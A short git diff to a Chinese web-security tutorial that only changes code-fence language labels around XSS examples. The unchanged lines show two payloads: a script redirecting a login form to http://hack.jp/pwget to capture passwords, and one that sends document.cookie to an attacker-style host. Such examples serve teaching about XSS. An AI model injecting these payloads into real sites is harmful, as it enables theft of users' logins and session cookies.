@@ -17,13 +17,13 @@ __前言:__网络安全一直是风口浪尖，尤其这几年随着前端的发
 
 * 登陆页表单验证
 
-```HTML js
+```HTML
 ID <input type="text" name="ID" value=""><script> var f = document.getElementById("login"); f.action = "http://hack.jp/pwget";f.method = "get";</script><span s="" />
 ```
 
 * 恶意构造脚本，窃取用户的Cookie信息
 
-```js
+```HTML
 <script src="http://hacker.jp/xss.js">
 var content = escape(document.cookie);
 document.write("<img src=http://hackr.jp/?");
